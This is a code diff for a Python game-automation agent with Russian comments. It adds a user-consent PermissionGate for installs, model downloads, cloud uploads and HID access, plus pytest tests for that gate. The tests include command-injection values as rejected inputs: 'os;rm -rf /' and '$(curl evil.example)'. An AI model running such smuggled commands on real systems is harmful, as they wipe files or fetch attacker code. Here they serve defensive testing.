+-    if text is None:
+-        return None
+     try:
+         t = tuple(map(float, text.split(",")))
+         if len(t) != 4 or not 0 <= t[0] < t[2] <= 1 or not 0 <= t[1] < t[3] <= 1:
+             raise ValueError()
+         return t
+-    except ValueError:
+-        raise argparse.ArgumentTypeError("ROI: x1,y1,x2,y2 в диапазоне 0..1")
++    except ValueError as ex:
++        raise argparse.ArgumentTypeError("ROI: x1,y1,x2,y2 в диапазоне 0..1") from ex
++
++
++def origin(text):
++    try:
++        x, y = (int(v) for v in text.split(","))
++        if x < 0 or y < 0:
++            raise ValueError()
++        return x, y
++    except ValueError as ex:
++        raise argparse.ArgumentTypeError("HID origin: x,y (неотрицательные координаты)") from ex
++
++
++class UnavailableVLM:
++    """Выключаем локальные запросы, когда пользователь отказался от модели."""
++    def ask_json(self, jpeg, prompt, schema=None):
++        return {"dsl": "IF False THEN wait()", "confidence": 0.0}
++
++
++def inspect_ollama_models() -> set[str] | None:
++    """Только чтение локального списка моделей. Никаких автоматических загрузок."""
++    if not shutil.which("ollama"):
++        return None
++    try:
++        p = subprocess.run(["ollama", "list"], capture_output=True, text=True,
++                           timeout=8, check=False)
++    except (OSError, subprocess.TimeoutExpired):
++        return None
++    if p.returncode:
++        return None
++    return {line.split()[0] for line in p.stdout.splitlines()[1:] if line.strip()}
++
++
++def prepare_local_model(gate: PermissionGate, model: str):
++    """Устанавливать Ollama из сети агент не вправе: только ручная инструкция."""
++    from game_agent.l4.local_vlm import LocalVLM
++    models = inspect_ollama_models()
++    if models is None:
++        print("[fallback] Ollama недоступна — остаются OpenCV, OCR, YOLO и старый Worker.")
++        gate.require_external_action(
++            title="Установить/запустить Ollama вручную",
++            exact_action="Открыть https://ollama.com/download и установить Ollama самостоятельно",
++            technical_reason="нет доступной локальной VLM, невозможен анализ сложных сцен",
++            user_benefit="обработка кадров локально вместо облачного API",
++            risks="системная установка отдельной программы; нагрузка на GPU/CPU",
++        )
++        return LocalVLM(backend=UnavailableVLM())
++    if model not in models:
++        try:
++            if not gate.ensure_ollama_model(model, available_models=models):
++                print("[fallback] Пользователь отказался от модели; локальная VLM выключена.")
++                return LocalVLM(backend=UnavailableVLM())
++        except (OSError, SetupFailed) as exc:
++            print(f"[fallback] Модель недоступна: {exc}")
++            return LocalVLM(backend=UnavailableVLM())
++    return LocalVLM(model=model)
+ 
+ 
+ def main():
+-    p = argparse.ArgumentParser(description="Уровень 4 без удаления L3")
++    p = argparse.ArgumentParser(description="Universal Game Agent Level 4 / PermissionGate")
+     p.add_argument("--device")
+     p.add_argument("--game", default="generic")
+     p.add_argument("--goal", default="исследовать интерфейс безопасно")
+@@ -28,32 +89,95 @@
+     p.add_argument("--yolo", action="store_true")
+     p.add_argument("--weights")
+     p.add_argument("--chroma", action="store_true")
++    p.add_argument("--onnx", action="store_true", help="проверить ONNX-зависимость (потребуются веса и адаптер)")
+     p.add_argument("--execute", action="store_true")
+-    p.add_argument("--cloud", action="store_true", help="Отправка скриншотов облачной VLM — явное согласие")
++    p.add_argument("--cloud", action="store_true", help="разрешение на отправку кадров запрашивается отдельно")
++    p.add_argument("--local-model", default="qwen2.5vl:3b")
++    p.add_argument("--hid-port", help="например COM5; требует явного разрешения")
++    p.add_argument("--hid-origin", type=origin, help="проверенная калибровка x,y указателя HID")
+     p.add_argument("--hp-roi", type=roi)
+     p.add_argument("--mp-roi", type=roi)
+     p.add_argument("--max-steps", type=int, default=20)
++    p.add_argument("--preflight-only", action="store_true", help="только проверка зависимостей без ADB")
+     args = p.parse_args()
+-    if args.yolo and not args.weights:
+-        p.error("Для --yolo нужны обученные веса --weights")
+     if args.max_steps < 0:
+-        p.error("--max-steps должно быть >=0")
++        p.error("--max-steps должно быть >= 0")
++    if args.yolo and not args.weights:
++        p.error("Для --yolo нужны веса --weights")
++    if args.hid_origin and not args.hid_port:
++        p.error("--hid-origin требует --hid-port")
++
++    gate = PermissionGate()
++    # Сначала проверяем зависимости и запросы разрешений, без скрытых установок.
++    capabilities = preflight(gate, ocr=args.ocr, yolo=args.yolo,
++                             chroma=args.chroma, onnx=args.onnx,
++                             hid=bool(args.hid_port))
++    for feature in ("ocr", "yolo", "chroma", "onnx", "hid"):
++        if getattr(args, feature, False) and not capabilities[feature]:
++            print(f"[fallback] {feature} отключено: зависимость недоступна/разрешение отклонено")
++    if args.preflight_only:
++        print("Проверка зависимостей завершена. Телефон не использовался.")
++        return
++
++    if not check_adb(gate, os.getenv("ADB_PATH", "adb")):
++        raise PermissionDenied("ADB отсутствует. Выполните ручную установку и перезапустите агент")
++    if args.cloud and not gate.require_external_action(
++        title="Разрешить облачный Vision API на текущую сессию",
++        exact_action="Отправлять кадры игры указанному в настройках VLM API",
++        technical_reason="локальный анализ может оказаться неуверенным (<0.7)",
++        user_benefit="получить дополнительную оценку сложных сцен",
++        risks="изображения экрана передаются третьей стороне; возможны расходы и персональные данные",
++        risk=Risk.HIGH,
++    ):
++        args.cloud = False
++        print("[fallback] облачная VLM отключена")
+     if args.cloud and not os.getenv("VLM_API_KEY"):
+-        p.error("Для --cloud задайте VLM_API_KEY")
+-    cloud = VLM("openai", os.getenv("CLOUD_VLM_MODEL", "gpt-4o"),
+-                api_key=os.getenv("VLM_API_KEY", "")) if args.cloud else None
++        print("[fallback] VLM_API_KEY отсутствует: облачная VLM выключена")
++        args.cloud = False
++
++    # Только после preflight импортируем старые модули, которым нужны cv2/numpy.
++    from game_agent.config import Settings
++    from game_agent.vlm import VLM
++    from game_agent.l4.agent_l4 import Level4Agent
++    from game_agent.adb import ADBDevice
++    from game_agent.l4.hid import (SerialHIDTransport, CalibratedHIDInput,
++                                  HIDWithADBFallback)
++    local_vlm = prepare_local_model(gate, args.local_model)
++    cloud = (VLM("openai", os.getenv("CLOUD_VLM_MODEL", "gpt-4o"),
++                 api_key=os.getenv("VLM_API_KEY", "")) if args.cloud else None)
+     cfg = Settings(serial=args.device, game_id=args.game, user_goal=args.goal,
+-                   dry_run=not args.execute, enable_ocr=args.ocr,
+-                   enable_yolo=args.yolo, yolo_weights=args.weights,
+-                   enable_chroma=args.chroma, max_steps=args.max_steps)
++                   dry_run=not args.execute, enable_ocr=capabilities["ocr"],
++                   enable_yolo=capabilities["yolo"],
++                   yolo_weights=args.weights if capabilities["yolo"] else None,
++                   enable_chroma=capabilities["chroma"], max_steps=args.max_steps,
++                   vlm_provider="ollama", vlm_model=args.local_model)
++    device = ADBDevice(cfg.adb_path, cfg.serial)
++    hid_port = args.hid_port if capabilities["hid"] else None
++    if hid_port:
++        if gate.require_external_action(
++            title="Открыть HID Serial-порт",
++            exact_action=f"Открыть {hid_port} для ограниченного протокола движения/нажатий",
++            technical_reason="альтернативный транспорт для тестового оборудования",
++            user_benefit="аппаратная совместимость с откалиброванным HID-стендом",
++            risks="внешнее устройство может ошибочно отправить ввод; нужен USB Host/OTG",
++            risk=Risk.HIGH,
++        ):
++            transport = SerialHIDTransport(hid_port)
++            hid = CalibratedHIDInput(transport,
++                  *(args.hid_origin or (None, None)), calibrated=args.hid_origin is not None)
++            device = HIDWithADBFallback(device, hid)
++        else:
++            print("[fallback] пользователь отклонил HID — используется ADB")
+     logging.basicConfig(level=logging.INFO, format="%(asctime)s %(levelname)s %(message)s")
+     print("L4: " + ("ИСПОЛНЕНИЕ" if args.execute else "DRY RUN (без нажатий)"))
+-    Level4Agent(cfg, hp_roi=args.hp_roi, mp_roi=args.mp_roi,
+-                cloud_vlm=cloud, allow_cloud=args.cloud).run()
++    Level4Agent(cfg, device=device, hp_roi=args.hp_roi, mp_roi=args.mp_roi,
++                local_vlm=local_vlm, cloud_vlm=cloud, allow_cloud=args.cloud).run()
+ 
+ 
+ if __name__ == "__main__":
+     try:
+         main()
++    except (PermissionDenied, SetupFailed) as exc:
++        print(f"ОСТАНОВЛЕНО: {exc}")
+     except KeyboardInterrupt:
+-        print("Остановлено Ctrl+C")
++        print("Остановлено пользователем")
+diff -ruN '--exclude=__pycache__' '--exclude=.pytest_cache' '--exclude=*.pyc' /mnt/data/UniversalGameAgent_v4/tests/test_permission_gate.py /mnt/data/UniversalGameAgent_v4_PermissionGate/tests/test_permission_gate.py
+--- /mnt/data/UniversalGameAgent_v4/tests/test_permission_gate.py	1970-01-01 00:00:00.000000000 +0000
++++ /mnt/data/UniversalGameAgent_v4_PermissionGate/tests/test_permission_gate.py	2026-10-09 17:18:11.789206268 +0000
+@@ -0,0 +1,126 @@
++"""Уровень 4: отсутствие скрытых установок, одноразовые Y/N, fallback."""
++from __future__ import annotations
++import builtins
++from dataclasses import dataclass
++from types import SimpleNamespace
++import pytest
++
++from game_agent.l4.security import (
++    PermissionGate, PermissionRequest, PermissionDenied,
++    SetupFailed, DEPENDENCIES
++)
++from game_agent.l4.bootstrap import preflight
++
++
++@pytest.fixture
++def fake_request():
++    return PermissionRequest("Установить пакет", "python -m pip install example",
++                             "нет библиотеки", "добавляет функцию", "затраты места")
++
++
++def test_deny_non_y(fake_request):
++    for answer in ("N", "", "yes", "да", "OK", "Y / N"):
++        gate = PermissionGate(ask=lambda _: answer, output=lambda _: None)
++        assert not gate.approve(fake_request)
++
++
++def test_explicit_y_once(fake_request):
++    calls = []
++    gate = PermissionGate(ask=lambda p: " Y ", output=calls.append)
++    assert gate.approve(fake_request)
++    assert any("Техническая причина" in s for s in calls)
++    assert any("Польза" in s for s in calls)
++    assert any("Риски" in s for s in calls)
++    assert any("Точная операция" in s for s in calls)
++
++
++def test_ctrl_c_eof_deny(fake_request):
++    def no_console(_):
++        raise EOFError
++    assert not PermissionGate(ask=no_console, output=lambda _:None).approve(fake_request)
++
++
++def test_optional_dependency_denied_does_not_run(monkeypatch):
++    commands = []
++    gate = PermissionGate(ask=lambda _: "N", output=lambda _:None,
++                          runner=lambda cmd, **kwargs: commands.append(cmd))
++    monkeypatch.setattr(gate, 'available', lambda _: False)
++    assert gate.ensure_dependency('easyocr', required=False) is False
++    assert commands == []
++
++
++def test_required_dependency_denied_stops(monkeypatch):
++    commands = []
++    gate = PermissionGate(ask=lambda _: "N", output=lambda _:None,
++                          runner=lambda cmd, **kwargs: commands.append(cmd))
++    monkeypatch.setattr(gate, 'available', lambda _: False)
++    with pytest.raises(PermissionDenied):
++        gate.ensure_dependency('numpy', required=True)
++    assert commands == []
++
++
++def test_explicit_permission_invokes_exact_allowlist_command(monkeypatch):
++    called=[]
++    gate=PermissionGate(ask=lambda _: 'Y',output=lambda _: None,
++                        runner=lambda cmd,**kw: (called.append(cmd), SimpleNamespace(returncode=0))[1])
++    states=iter([False,True])
++    monkeypatch.setattr(gate,'available',lambda name:next(states))
++    assert gate.ensure_dependency('serial')
++    assert len(called)==1
++    assert called[0][-1] == DEPENDENCIES['serial'].requirement
++    assert called[0][1:4] == ['-m','pip','install']
++    assert isinstance(called[0],list)
++
++
++def test_no_arbitrary_dependency_name(monkeypatch):
++    gate=PermissionGate(ask=lambda _: 'Y', output=lambda _:None)
++    monkeypatch.setattr(gate,'available',lambda _:False)
++    with pytest.raises(ValueError):
++        gate.ensure_dependency("os;rm -rf /")
++
++
++def test_declined_model_not_downloaded():
++    calls=[]
++    gate=PermissionGate(ask=lambda _: 'N',output=lambda _:None,
++                        runner=lambda cmd,**kw:calls.append(cmd))
++    assert not gate.ensure_ollama_model('qwen2.5vl:3b', available_models=set())
++    assert calls==[]
++
++
++def test_approved_model_exact_command():
++    calls=[]
++    gate=PermissionGate(ask=lambda _: 'Y', output=lambda _:None,
++                        runner=lambda cmd,**kw:(calls.append(cmd), SimpleNamespace(returncode=0))[1])
++    assert gate.ensure_ollama_model('qwen2.5vl:3b',available_models=set())
++    assert calls==[['ollama','pull','qwen2.5vl:3b']]
++
++
++def test_untrusted_model_never_downloaded():
++    gate=PermissionGate(ask=lambda _: 'Y',output=lambda _:None)
++    with pytest.raises(ValueError):
++        gate.ensure_ollama_model('$(curl evil.example)',available_models=set())
++
++
++def test_preflight_no_optional_installs(monkeypatch):
++    calls=[]
++    gate=PermissionGate(ask=lambda _: 'N',output=lambda _:None,
++                        runner=lambda cmd,**kw:calls.append(cmd))
++    monkeypatch.setattr(gate,'available', lambda _:True)
++    cap=preflight(gate)
++    assert all(not v for v in cap.values())
++    assert calls==[]
++
++
++def test_ocr_reader_cannot_auto_download(monkeypatch):
++    import sys
++    import types
++    calls=[]
++    fake=types.ModuleType('easyocr')
++    def reader(*args,**kwargs):
++        calls.append(kwargs)
++        return object()
++    fake.Reader=reader
++    monkeypatch.setitem(sys.modules, 'easyocr', fake)
++    from game_agent.perception import Perception
++    Perception(enable_ocr=True)
++    assert calls and calls[0]['download_enabled'] is False
